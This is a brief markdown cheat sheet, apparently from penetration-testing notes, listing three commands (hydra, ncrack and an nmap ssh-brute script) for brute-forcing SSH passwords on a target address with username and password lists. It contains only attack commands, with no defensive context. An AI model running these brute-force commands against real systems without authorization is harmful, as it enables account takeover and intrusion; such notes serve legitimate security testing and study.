# Password cracking
### Cracking SSH Password

```bash
hydra -L <username list> -P <password list> 10.10.10.10 ssh
```
```bash
ncrack -U <usernames list> -P <passwords list> ssh://10.10.10.10
```
```bash
nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s <ip>
```
